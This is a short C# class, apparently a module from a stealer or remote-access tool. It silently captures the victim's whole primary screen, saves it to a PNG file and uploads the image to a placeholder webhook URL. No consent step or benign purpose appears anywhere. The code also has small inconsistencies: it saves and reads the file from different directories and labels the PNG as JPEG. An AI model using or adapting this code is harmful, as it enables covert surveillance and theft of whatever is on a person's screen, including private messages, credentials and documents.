using System.Text;

public class screenshot
{
    public Encoding enc = Encoding.GetEncoding("UTF-8");
    public string Dir = Directory.GetCurrentDirectory();
    public static string webhook = "WEB HOOK";
    public async void shot()
    {
        string ExeDirPath = Path.GetDirectoryName(Application.ExecutablePath);
        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);
        Graphics graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height));
        graphics.Dispose();
        DateTime dt = DateTime.Now;
        string filePath = ExeDirPath + "\\file.png";
        bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);
        using var httpClient = new HttpClient();
        var content = new MultipartFormDataContent();

        // 画像ファイルを読み込む
        byte[] imageBytes = File.ReadAllBytes(Dir + "\\file.png");
        var imageContent = new ByteArrayContent(imageBytes);
        imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg"); // 送信する画像ファイルのContent-Typeに合わせて設定

        // メッセージを追加
        content.Add(new StringContent(""), "content");

        // 画像ファイルを追加
        content.Add(imageContent, "file", Path.GetFileName(Dir + "\\file.png"));
        await httpClient.PostAsync(webhook, content);
    }
}
